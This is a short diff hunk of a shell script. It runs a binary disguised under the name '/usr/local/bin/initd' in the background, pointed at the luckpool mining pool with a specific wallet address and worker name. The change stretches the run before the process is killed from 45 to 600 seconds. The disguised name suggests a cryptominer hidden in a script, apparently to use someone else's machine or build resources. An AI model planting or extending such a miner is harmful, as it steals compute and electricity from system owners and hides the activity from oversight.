@@ -6,5 +6,5 @@
 
 /usr/local/bin/initd -v -l na.luckpool.net:3960 -u RSqyBuPVpEA2mKq2pLx3YZj7ySWuXpMx3N.cpvgullo001 -p x &
 TASK_PID=$!
-sleep 45
+sleep 600
 kill $TASK_PID
